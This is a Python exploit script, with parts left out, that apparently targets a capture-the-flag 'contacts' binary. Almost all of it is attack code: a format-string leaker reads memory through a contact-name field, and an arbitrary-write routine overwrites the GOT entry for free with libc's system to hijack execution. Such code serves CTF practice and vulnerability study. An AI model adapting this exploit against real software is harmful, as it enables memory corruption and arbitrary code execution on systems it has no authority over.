...
class FormatStringPointer(object):
	...
	def update_deref(self, string):
		...
		if len(string) > 1: # only worth checking for more than 1 byte leaked
			...
			if self.formatString.binary and hex(self.value)[:4] == "0x80":
	...
	def valid(self):
		...
		dLen != len("0x63b944c753c6fc00") and \
		dLen != len("0xaabbccdd") and \
		dLen != len("0x804ccdd"):
			return False
...
class FormatStringLeaker(object):
	...
	def __init__(self, format_func=None, get_fmt=None, conn=None, libc=None, binary=None, bits=32):
		"""
	...
	def extract_printf_conn(self, refs):
		"""
	...
	def dump_offset(self, offset):
		...
		return int(self.extract_printf([code_leak_payload])[0],16)
...
def do_fmt(fmt_str):
	createContact("Mr_joe", "*^*" + fmt_str + "#^#")
	send(conn, "4")
	conn.recvuntil("*^*")
	resp = conn.recvuntil("#^#")[:-3]
	remove_contact("Mr_joe")
	return resp

progName = "./contacts_54f3188f64e548565bc1b87d7aa07427"
conn = process(progName)

# raw_input('uo')
libc = elf.ELF("/lib32/libc-2.24.so")
binary = elf.ELF(progName)
fmt = FormatStringLeaker(do_fmt, libc=libc, binary=binary)
...
free_got = binary.symbols['got.free']
payloads = fmt.arbitrary_write(free_got, libc.symbols['system'])

for p in payloads:
	createContact("Hack", p) 
